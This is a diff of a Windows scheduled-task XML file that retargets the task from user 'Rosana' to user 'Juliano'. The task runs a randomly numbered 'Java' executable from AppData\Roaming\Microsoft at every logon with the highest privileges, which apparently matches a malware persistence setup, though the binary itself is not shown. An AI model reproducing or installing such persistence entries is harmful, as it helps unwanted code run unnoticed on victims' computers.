@@ -2,12 +2,12 @@
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
     <Date>2000-10-25T14:27:44.8929027</Date>
-    <Author>ROSANA-PC\Rosana</Author>
+    <Author>JULIANO-PC\Juliano</Author>
   </RegistrationInfo>
   <Triggers>
     <LogonTrigger>
       <Enabled>true</Enabled>
-      <UserId>ROSANA-PC\Rosana</UserId>
+      <UserId>JULIANO-PC\Juliano</UserId>
     </LogonTrigger>
     <RegistrationTrigger>
       <Enabled>false</Enabled>
@@ -15,7 +15,7 @@
   </Triggers>
   <Principals>
     <Principal id="Author">
-      <UserId>ROSANA-PC\Rosana</UserId>
+      <UserId>JULIANO-PC\Juliano</UserId>
       <LogonType>InteractiveToken</LogonType>
       <RunLevel>HighestAvailable</RunLevel>
     </Principal>
@@ -41,7 +41,7 @@
   </Settings>
   <Actions Context="Author">
     <Exec>
-      <Command>C:\Users\Rosana\AppData\Roaming\Microsoft\Java35176452476445.exe</Command>
+      <Command>C:\Users\Juliano\AppData\Roaming\Microsoft\Java35176452476445.exe</Command>
       <Arguments></Arguments>
     </Exec>
   </Actions>
